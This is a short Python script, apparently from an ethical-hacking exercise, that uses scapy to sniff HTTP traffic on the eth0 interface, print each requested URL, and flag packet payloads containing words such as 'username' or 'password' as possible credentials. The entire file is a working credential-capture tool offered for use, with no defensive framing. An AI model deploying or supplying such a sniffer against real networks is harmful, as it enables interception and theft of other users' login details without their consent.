#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_URL(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "usr", "psw", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_URL(packet)
        print("[+] HTTP request >>" + str(url))
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] possible username/password >" + login_info + "\n\n")


sniff("eth0")